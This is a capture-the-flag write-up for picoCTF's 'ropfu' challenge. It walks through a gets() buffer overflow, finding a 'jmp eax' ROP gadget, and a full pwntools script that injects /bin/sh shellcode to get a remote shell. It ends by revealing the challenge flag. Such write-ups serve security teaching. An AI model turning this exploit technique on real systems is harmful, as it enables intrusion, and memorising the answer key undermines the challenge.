
# ropfu

*Hard*

>### Description
>What's ROP?
Can you exploit the following [program](https://artifacts.picoctf.net/c/44/vuln) to get the flag? [Download source](https://artifacts.picoctf.net/c/44/vuln.c).
`nc saturn.picoctf.net 62081`

### Solution

The program asks for user input, and doesn't seem to do anything. Lets look at the source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 16

void vuln() {
  char buf[16];
  printf("How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n");
  return gets(buf);

}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);


  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();

}
```

- We can also see that the `vuln()` uses gets() instead of fgets(), so it is probably vulnerable to overflows. 

Debug the binary to find out where our input gets put in memory, and find the offset, etc. Find how it is run behind the scenes with **gdb**.

>I was using the WRONG EXECUTABLE when debugging, so WASTED 2.5 hours!!! :(

Using a debugger, I find that the offset between the user input and the return address is 28 bytes. And since this is a ROP (return oriented programming) challenge, we probably have to get a shell. 

>First time for me, so I had to look up a writeup on how to do it.

After the gets(), the address of our input is in EAX, so we want to return some line in the code that jumps to/calls EAX (gadget). Use `ROPgadget --binary vuln | grep "jmp eax"` to find a line: `0x0805333b : jmp eax`. We must overwrite the return address to 0x0805333b, and implement a shell in our input. The padding bytes we use to get to the 28 bytes offset will be 0x90; nop instructions. And the last 2 of these bytes will be one little jmp 0x04 instruction to jmp over the address.

I kinda copied python code to exploit:
```python
import pwn
import sys

payload = b'\x90' * 26
payload += b'\xeb\x04'
payload += pwn.p32(0x0805333b)

payload += pwn.asm(pwn.shellcraft.i386.linux.sh())

p = pwn.remote('saturn.picoctf.net', 52440)

p.sendline(payload)
p.interactive()
```

Now we get a shell! Find the flag file using `ls`, and read the contents using `cat`.

<details>
<summary>Yes! We got the flag:</summary> 
picoCTF{5n47ch_7h3_5h311_4cbbb771}
</details>
